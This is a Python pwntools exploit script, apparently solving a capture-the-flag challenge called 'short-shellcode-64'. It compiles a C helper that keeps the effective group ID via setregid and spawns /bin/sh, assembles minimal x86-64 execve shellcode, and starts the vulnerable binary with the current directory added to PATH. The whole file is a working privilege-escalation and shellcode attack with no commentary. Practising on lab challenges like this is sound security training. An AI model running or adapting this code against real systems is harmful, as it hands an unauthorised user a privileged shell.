from pwn import *

context.arch = 'x86-64'
context.bits = 64

c_code = '''
#include <unistd.h>
int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

shellcode = asm('''
    cdq    
    xor esi, esi

    push  rdx
    push   0x7a

    push   rsp
    pop    rdi

    mov al, 0x3b
    syscall
''')

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)


print(f"disasm(shellcode) = {disasm(shellcode)}")


env = {"PATH":"$PATH:."}
file = "./short-shellcode-64"
DEBUG = False


if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
b *0x400bcd
continue
''')
else:
    io = process(file, env=env)

io.interactive()
